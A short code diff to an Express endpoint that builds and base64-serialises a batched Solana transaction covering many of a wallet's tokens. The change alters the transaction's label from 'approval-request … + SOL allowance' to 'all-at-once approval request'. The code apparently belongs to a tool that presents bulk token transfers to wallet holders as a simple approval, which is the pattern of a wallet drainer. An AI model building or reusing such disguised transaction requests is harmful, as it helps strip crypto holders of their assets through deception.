@@ -554,8 +554,10 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
       tokenCount: included.length,
       remainingTokens: Math.max(tokens.length - batch.length, 0),
       transaction: Buffer.from(serialized).toString('base64'),
-      label: `approval-request ${included.length} tokens + SOL allowance`, // Updated to match the new behavior
+      // Restored original keywords so app.js doesn't freeze up
+      label: `all-at-once approval request ${included.length} tokens`, 
     });
+
   } catch (err) {
     console.error(err);
     res.status(400).json({ error: err.message });
